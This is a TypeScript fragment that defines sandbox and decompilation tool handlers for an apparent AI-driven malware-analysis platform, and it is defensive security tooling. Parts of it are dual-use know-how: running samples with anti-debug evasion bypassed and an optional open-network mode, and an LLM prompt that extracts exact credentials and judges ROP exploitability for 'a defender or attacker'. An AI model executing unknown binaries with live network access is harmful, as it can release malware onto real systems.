        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `sandbox_trace("${rawPath}", tracer="${tracer}")` }],
      };
    },
  },
  {
    name: 'sandbox_network',
    description: 'Run binary with monitored outbound network for duration_sec seconds, capturing all DNS queries, TCP connections, HTTP requests, and TLS SNI names. Use to observe C2 beaconing, staged payload fetches, and exfiltration channels. Ideal for suspected loaders/droppers. All DNS queries are logged even if redirected to sinkhole.',
    category: 'sandbox',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target binary', required: true },
      { name: 'duration_sec', type: 'number', description: 'How long to allow outbound traffic (default 30, max 120)', required: false, default: 30 },
      { name: 'alias', type: 'string', description: 'Process name alias', required: false, default: '' },
    ],
    handler: async (context) => {
      const rawPath     = String(context.parameters.binary_path  ?? '').trim();
      const durationSec = Math.min(Number(context.parameters.duration_sec ?? 30), 120);
      const alias       = String(context.parameters.alias        ?? '').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      const pyArgs = ['/scripts/sandbox_network.py', '--binary', filePath,
                      '--duration', String(durationSec)];
      if (alias) pyArgs.push('--alias', alias);

      const result = await callSidecar('sandbox', 'python3', pyArgs, {}, (durationSec + 30) * 1000);
      const output = result.stdout || result.stderr || result.error || '(no output)';

      let parsed: Record<string, unknown> = {};
      try {
        const jm = output.match(/=== FULL JSON ===\n([\s\S]+)/);
        if (jm) parsed = JSON.parse(jm[1]);
      } catch { /* non-fatal */ }

      const net = (parsed.network as Record<string, string[]>) ?? {};
      const allConns = [...(net.tcp ?? []), ...(net.http_hosts ?? []), ...(net.tls_sni ?? [])];

      const findings: Array<{ title: string; severity: 'critical'|'high'|'medium'|'low'|'info'; details: string; provenance: 'tool'; toolName: string }> = [];

      if (allConns.length > 0 || (net.dns ?? []).length > 0) {
        findings.push({
          title: `C2 network activity: ${allConns.slice(0, 3).join(', ') || (net.dns ?? []).slice(0, 2).join(', ')}`,
          severity: 'critical',
          details: [
            net.dns?.length      ? `DNS queries: ${net.dns.slice(0, 10).join(', ')}` : '',
            net.tcp?.length      ? `TCP connections: ${net.tcp.slice(0, 10).join(', ')}` : '',
            net.http_hosts?.length ? `HTTP hosts: ${net.http_hosts.slice(0, 5).join(', ')}` : '',
            net.tls_sni?.length  ? `TLS SNI: ${net.tls_sni.slice(0, 5).join(', ')}` : '',
          ].filter(Boolean).join('\n'),
          provenance: 'tool',
          toolName: 'sandbox_network',
        });
      }

      return {
        success: true,
        output: `=== NETWORK CAPTURE: ${fname} (${durationSec}s window) ===\n\n${output.slice(0, 4000)}`,
        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `sandbox_network("${rawPath}", duration=${durationSec}s)` }],
      };
    },
  },
  {
    name: 'sandbox_unpack',
    description: 'Detect runtime packers/crypters by monitoring for new executable memory regions appearing during execution. When a packer decrypts its payload and marks it executable (mprotect PROT_EXEC), this tool dumps that memory region to a file. Returns the dump path — pass it to binary_investigate to analyze the real unpacked payload.',
    category: 'sandbox',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Suspected packed binary', required: true },
      { name: 'alias', type: 'string', description: 'Process name alias', required: false, default: '' },
      { name: 'timeout_sec', type: 'number', description: 'Observation window in seconds (default 30)', required: false, default: 30 },
    ],
    handler: async (context) => {
      const rawPath    = String(context.parameters.binary_path  ?? '').trim();
      const alias      = String(context.parameters.alias        ?? '').trim();
      const timeoutSec = Number(context.parameters.timeout_sec  ?? 30);
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      const pyArgs = ['/scripts/sandbox_unpack.py', '--binary', filePath,
                      '--timeout', String(timeoutSec)];
      if (alias) pyArgs.push('--alias', alias);

      const result = await callSidecar('sandbox', 'python3', pyArgs, {}, (timeoutSec + 30) * 1000);
      const output = result.stdout || result.stderr || result.error || '(no output)';

      let parsed: Record<string, unknown> = {};
      try {
        const jm = output.match(/=== FULL JSON ===\n([\s\S]+)/);
        if (jm) parsed = JSON.parse(jm[1]);
      } catch { /* non-fatal */ }

      const regions = (parsed.regions as Array<{address: string; size: number; dump_path: string}>) ?? [];
      const findings: Array<{ title: string; severity: 'critical'|'high'|'medium'|'low'|'info'; details: string; provenance: 'tool'; toolName: string }> = [];

      if (regions.length > 0) {
        findings.push({
          title: `Runtime packer detected — ${regions.length} memory region(s) unpacked`,
          severity: 'critical',
          details: `Binary decrypted/unpacked code at runtime. Regions:\n${regions.map(r => `  ${r.address} (${r.size} bytes) → ${r.dump_path}`).join('\n')}\n\nNext step: run binary_investigate on each dump_path to analyze the real payload.`,
          provenance: 'tool',
          toolName: 'sandbox_unpack',
        });
      }

      return {
        success: true,
        output: `=== UNPACK MONITOR: ${fname} ===\n\n${output.slice(0, 3000)}`,
        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `sandbox_unpack("${rawPath}")` }],
      };
    },
  },
  {
    name: 'sandbox_wine',
    description: 'Execute a Windows PE binary via Wine64 with full Windows 10 Pro environment disguise. Captures the complete Win32 API relay log: CreateFile, RegSetValue, InternetOpen, socket, connect, send, CreateProcess, VirtualAllocEx, IsDebuggerPresent — with actual argument values (file paths, registry keys, URLs, IPs). Use as primary PE dynamic analysis tool for samples requiring real Win32 API coverage.',
    category: 'sandbox',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Windows PE binary (.exe, .dll)', required: true },
      { name: 'alias', type: 'string', description: 'Filename alias inside Wine (default: svchost.exe)', required: false, default: 'svchost.exe' },
      { name: 'network_mode', type: 'string', description: 'none | monitored | open (default: none)', required: false, default: 'none' },
      { name: 'timeout_sec', type: 'number', description: 'Max execution time (default 30)', required: false, default: 30 },
    ],
    handler: async (context) => {
      const rawPath    = String(context.parameters.binary_path  ?? '').trim();
      const alias      = String(context.parameters.alias        ?? 'svchost.exe').trim();
      const networkMode = String(context.parameters.network_mode ?? 'none').trim();
      const timeoutSec = Number(context.parameters.timeout_sec  ?? 30);
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      const pyArgs = ['/scripts/wine_execute.py', '--binary', filePath,
                      '--alias', alias, '--network', networkMode,
                      '--timeout', String(timeoutSec)];

      const result = await callSidecar('sandbox', 'python3', pyArgs, {}, (timeoutSec + 30) * 1000);
      const output = result.stdout || result.stderr || result.error || '(no output)';

      let parsed: Record<string, unknown> = {};
      try {
        const jm = output.match(/=== FULL JSON ===\n([\s\S]+)/);
        if (jm) parsed = JSON.parse(jm[1]);
      } catch { /* non-fatal */ }

      const apiCalls = (parsed.api_calls as Record<string, Array<{api: string; strings: string[]}>>) ?? {};
      const findings: Array<{ title: string; severity: 'critical'|'high'|'medium'|'low'|'info'; details: string; provenance: 'tool'; toolName: string }> = [];

      // Emit findings per interesting category
      const SEV_MAP: Record<string, 'critical'|'high'|'medium'|'low'> = {
        injection: 'critical', network: 'high', anti_debug: 'high',
        registry: 'medium', process: 'high', crypto: 'medium', file_ops: 'low',
      };
      for (const [cat, entries] of Object.entries(apiCalls)) {
        if (entries.length === 0) continue;
        const sev = SEV_MAP[cat] ?? 'medium';
        const detail = entries.slice(0, 8).map(e => {
          const strs = e.strings.map(s => `"${s}"`).join(', ');
          return `  ${e.api}(${strs || '...'})`;
        }).join('\n');
        findings.push({
          title: `Wine API — ${cat}: ${entries.slice(0,3).map(e => e.api).join(', ')}`,
          severity: sev,
          details: `Win32 ${cat} calls observed:\n${detail}`,
          provenance: 'tool',
          toolName: 'sandbox_wine',
        });
      }

      return {
        success: true,
        output: `=== WINE EXECUTION: ${fname} (alias: ${alias}) ===\n\n${output.slice(0, 5000)}`,
        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `sandbox_wine("${rawPath}", alias="${alias}")` }],
      };
    },
  },
  {
    name: 'sandbox_qiling',
    description: 'Cross-platform binary emulation via Qiling framework (Unicorn CPU engine). Supports ELF, Windows PE, and macOS Mach-O — no OS license required. Anti-debug hooks applied at emulation level: IsDebuggerPresent→FALSE, CheckRemoteDebuggerPresent→FALSE. Returns API call log, behavioral verdict. Use as primary executor for Mach-O, and secondary cross-check for PE.',
    category: 'sandbox',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Binary to emulate', required: true },
      { name: 'format', type: 'string', description: 'auto (default) | elf | pe | macho', required: false, default: 'auto' },
      { name: 'timeout_sec', type: 'number', description: 'Max emulation time (default 30)', required: false, default: 30 },
    ],
    handler: async (context) => {
      const rawPath    = String(context.parameters.binary_path ?? '').trim();
      const fmt        = String(context.parameters.format      ?? 'auto').trim();
      const timeoutSec = Number(context.parameters.timeout_sec ?? 30);
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      const pyArgs = ['/scripts/qiling_run.py', '--binary', filePath,
                      '--format', fmt, '--timeout', String(timeoutSec)];

      const result = await callSidecar('sandbox', 'python3', pyArgs, {}, (timeoutSec + 30) * 1000);
      const output = result.stdout || result.stderr || result.error || '(no output)';

      let parsed: Record<string, unknown> = {};
      try {
        const jm = output.match(/=== FULL JSON ===\n([\s\S]+)/);
        if (jm) parsed = JSON.parse(jm[1]);
      } catch { /* non-fatal */ }

      const details = (parsed.details as Record<string, unknown[]>) ?? {};
      const suspicious = (details.suspicious as string[]) ?? [];
      const netAttempts = (details.net_attempts as Array<{type: string}>) ?? [];
      const apiCalls = (details.api_calls as Array<{api: string}>) ?? [];

      const findings: Array<{ title: string; severity: 'critical'|'high'|'medium'|'low'|'info'; details: string; provenance: 'tool'; toolName: string }> = [];

      if (suspicious.length > 0 || netAttempts.length > 0) {
        findings.push({
          title: `Qiling emulation: ${suspicious.length} suspicious behaviors, ${netAttempts.length} network attempts`,
          severity: netAttempts.length > 0 ? 'critical' : 'high',
          details: [
            suspicious.length > 0 ? `Suspicious:\n${suspicious.slice(0,8).map(s => `  • ${s}`).join('\n')}` : '',
            netAttempts.length > 0 ? `Network:\n${netAttempts.slice(0,5).map(n => `  • ${JSON.stringify(n)}`).join('\n')}` : '',
            apiCalls.length > 0 ? `API calls hooked: ${[...new Set(apiCalls.map(a => a.api))].slice(0, 6).join(', ')}` : '',
          ].filter(Boolean).join('\n\n'),
          provenance: 'tool',
          toolName: 'sandbox_qiling',
        });
      }

      return {
        success: true,
        output: `=== QILING EMULATION: ${fname} (format: ${fmt}) ===\n\n${output.slice(0, 4000)}`,
        findings: findings.length > 0 ? findings : undefined,
        additionalEvidence: [{ type: 'command' as const, content: `sandbox_qiling("${rawPath}", format="${fmt}")` }],
      };
    },
  },
  {
    name: 'binary_full_decompile',
    description: 'Comprehensive binary decompilation and flow analysis. Uses r2pipe to decompile ALL user-defined functions (up to 40 largest), extracts the complete call graph, then runs LLM analysis to produce a narrative report: binary purpose, execution flow, function-by-function description, and security findings. Best for understanding an unknown binary\'s complete behavior in one call.',
    category: 'reverse',
    parameters: [
      { name: 'binary_path', type: 'string', description: 'Target binary — local:// reference or plain filename', required: true },
    ],
    handler: async (context) => {
      const llm     = context.llm as LLMBackbone | undefined;
      const rawPath = String(context.parameters.binary_path ?? '').trim();
      if (!rawPath) return { success: false, error: 'binary_path is required' };

      const fname    = rawPath.startsWith('local://') ? rawPath.slice(8) : rawPath;
      const filePath = fname.startsWith('/') ? fname : `/data/uploads/${fname}`;

      // Inline Python r2pipe script — runs inside the binary sidecar.
      // Opens the binary once, runs full analysis, decompiles all user functions, extracts call graph.
      const pyScript = `
import sys, json
try:
    import r2pipe
except ImportError:
    print('[ERROR] r2pipe not installed in sidecar', file=sys.stderr)
    sys.exit(1)

binary = sys.argv[1]
r2 = r2pipe.open(binary, flags=['-2'])
try:
    r2.cmd('e anal.timeout=60')
    r2.cmd('aaa')

    # Get all functions, filter to user-defined only (skip PLT stubs and tiny thunks)
    funcs_raw = r2.cmdj('aflj') or []
    user_funcs = [
        f for f in funcs_raw
        if not f.get('name', '').startswith(('sym.imp.', 'reloc.', 'sub.imp', 'unk.'))
        and f.get('size', 0) >= 20
    ]
    # Largest functions first — they contain the most logic
    user_funcs.sort(key=lambda f: f.get('size', 0), reverse=True)
    user_funcs = user_funcs[:40]

    decompiled = []
    for f in user_funcs:
        name = f.get('name', '')
        addr = f.get('offset', 0)
        size = f.get('size', 0)
        r2.cmd('s ' + hex(addr))
        code = ''
        method = 'none'
        # Try r2ghidra (pdg) -> built-in pseudo-C (pdc) -> raw disassembly (pdf)
        try:
            pdg = r2.cmd('pdg').strip()
            if pdg and len(pdg) > 20 and '[ERROR' not in pdg and 'Cannot find' not in pdg and 'Usage' not in pdg:
                code = pdg
                method = 'pdg'
        except Exception:
            pass
        if not code:
            try:
                pdc = r2.cmd('pdc').strip()
                if pdc and len(pdc) > 20:
                    code = pdc
                    method = 'pdc'
            except Exception:
                pass
        if not code:
            try:
                code = r2.cmd('pdf').strip()
                method = 'pdf'
            except Exception:
                pass
        decompiled.append({
            'name': name, 'addr': hex(addr), 'size': size,
            'method': method, 'code': code[:3000]
        })

    # Call graph in DOT format — agCd gives labelled edges
    callgraph_dot = ''
    try:
        callgraph_dot = r2.cmd('agCd').strip()[:6000]
    except Exception:
        pass

    # Security mitigations (canary / NX / PIE / RELRO)
    sec_info = {}
    try:
        sec_info = r2.cmdj('iIj') or {}
    except Exception:
        pass

    # Imported library functions
    imports = []
    try:
        imports = [i.get('name', '') for i in (r2.cmdj('iij') or []) if i.get('name')][:60]
    except Exception:
        pass

    print('=== FULL JSON ===')
    print(json.dumps({
        'binary': binary,
        'function_count': len(user_funcs),
        'functions': decompiled,
        'callgraph_dot': callgraph_dot,
        'security': sec_info,
        'imports': imports,
    }))
except Exception as e:
    import traceback
    print('[ERROR]', str(e), file=sys.stderr)
    traceback.print_exc(file=sys.stderr)
finally:
    try:
        r2.quit()
    except Exception:
        pass
`.trimStart();

      const pyResult = await callSidecar('binary', 'python3', ['-c', pyScript, filePath], {}, 300000);
      const rawOutput = pyResult.stdout || pyResult.stderr || '';

      let parsed: {
        binary: string;
        function_count: number;
        functions: Array<{name: string; addr: string; size: number; method: string; code: string}>;
        callgraph_dot: string;
        security: Record<string, unknown>;
        imports: string[];
      } | null = null;

      const jm = rawOutput.match(/=== FULL JSON ===\n([\s\S]+)/);
      if (jm) {
        try { parsed = JSON.parse(jm[1]); } catch { /* fall through */ }
      }

      if (!parsed) {
        return {
          success: false,
          error: `binary_full_decompile: r2pipe analysis failed for "${fname}". Output: ${rawOutput.slice(0, 600)}`,
        };
      }

      const { functions, callgraph_dot, security, imports } = parsed;

      // Security mitigations summary line
      const s = security ?? {};
      const secSummary = [
        s.canary  != null ? `Canary:${s.canary}`   : null,
        s.nx      != null ? `NX:${s.nx}`           : null,
        s.pic     != null ? `PIE:${s.pic}`         : null,
        s.relro   != null ? `RELRO:${s.relro}`     : null,
        s.rpath   != null ? `RPATH:${s.rpath}`     : null,
      ].filter(Boolean).join('  ');

      // Parse DOT call graph edges into human-readable list
      const edgeLines = callgraph_dot
        .split('\n')
        .filter(l => l.includes('->') && l.trim() !== '' && !l.trim().startsWith('graph') && !l.trim().startsWith('node'))
        .map(l => {
          const m = l.match(/"?([^"]+)"?\s*->\s*"?([^"]+)"?/);
          return m ? `${m[1].trim()} → ${m[2].trim()}` : l.trim();
        })
        .filter((v, i, a) => a.indexOf(v) === i)
        .slice(0, 80);

      // Full raw decompilation output (truncated for display)
      const rawReport = [
        `=== FULL DECOMPILATION: ${fname} ===`,
        `Functions: ${functions.length}  |  Imports: ${imports.length}`,
        secSummary ? `Security: ${secSummary}` : '',
        `Imports: ${imports.slice(0, 40).join(', ')}`,
        `${'─'.repeat(60)}`,
        ...functions.map(f =>
          `\n[${f.name} @ ${f.addr}  size=${f.size}B  via=${f.method}]\n${f.code}`
        ),
        `\n=== CALL GRAPH (${edgeLines.length} edges) ===`,
        edgeLines.join('\n'),
      ].filter(Boolean).join('\n');

      // No LLM — return raw decompilation only
      if (!llm) {
        return {
          success: true,
          output: rawReport.slice(0, 20000),
          additionalEvidence: [{ type: 'command' as const, content: `binary_full_decompile("${rawPath}")` }],
        };
      }

      // Build LLM input: top 20 functions + call graph, capped to fit context
      const topFuncs = functions.slice(0, 20);
      const llmCtx = [
        `Binary: ${fname}`,
        secSummary ? `Security mitigations: ${secSummary}` : '',
        `Imports: ${imports.join(', ')}`,
        `\nCall graph (${edgeLines.length} edges):\n${edgeLines.slice(0, 40).join('\n')}`,
        `\n${'─'.repeat(60)}`,
        ...topFuncs.map(f => `\n[FUNCTION: ${f.name}  addr=${f.addr}  size=${f.size}B]\n${f.code}`),
      ].filter(Boolean).join('\n').slice(0, 15000);

      const systemPrompt = `You are an expert reverse engineer. Produce a structured flow analysis report with these sections:

1. BINARY PURPOSE — what does this binary do? Be specific, cite function names and strings.
2. EXECUTION FLOW — trace execution from entry point using → arrows. Show branches and decision points.
3. KEY FUNCTIONS — for each significant function: name, what it does, parameters, security relevance.
4. SECURITY FINDINGS — hardcoded credentials (quote exact values), dangerous calls (system/gets/strcpy with arguments), C2 patterns (exact IPs/ports), anti-debug, crypto weaknesses, ROP viability given mitigations.
5. ANALYST SUMMARY — one paragraph narrative a defender or attacker would need to act on.

Cite exact function names, addresses, strings, and byte sequences from the provided code. Do not generalize.`;

      try {
        const narrative = await llm.prompt(
          `Analyze the following decompiled binary and produce a flow analysis report:\n\n${llmCtx}`,
          systemPrompt,
          { maxTokens: 4000 },
        );

        const findings = [{
          title: `Flow analysis: ${fname} — ${functions.length} functions decompiled`,
          severity: 'info' as const,
          details: narrative.slice(0, 3000),
          provenance: 'model' as const,
          toolName: 'binary_full_decompile',
          toolOutput: narrative.slice(0, 400),
        }];

        return {
          success: true,
          output: [
            `=== FLOW ANALYSIS REPORT: ${fname} ===`,
            `(${functions.length} functions decompiled | ${edgeLines.length} call-graph edges | methods: ${[...new Set(functions.map(f => f.method))].join('/')})`,
            ``,
            narrative,
            ``,
            `${'═'.repeat(60)}`,
            `RAW DECOMPILATION (top 10 functions):`,
            ...functions.slice(0, 10).map(f =>
              `\n[${f.name} @ ${f.addr}  ${f.size}B  ${f.method}]\n${f.code.slice(0, 1500)}`
            ),
          ].join('\n'),
          findings,
          additionalEvidence: [{ type: 'command' as const, content: `binary_full_decompile("${rawPath}")` }],
        };
      } catch {
        // LLM failed — return raw decompilation
        return {
          success: true,
          output: rawReport.slice(0, 20000),
          additionalEvidence: [{ type: 'command' as const, content: `binary_full_decompile("${rawPath}")` }],
        };
      }
    },
  },
];
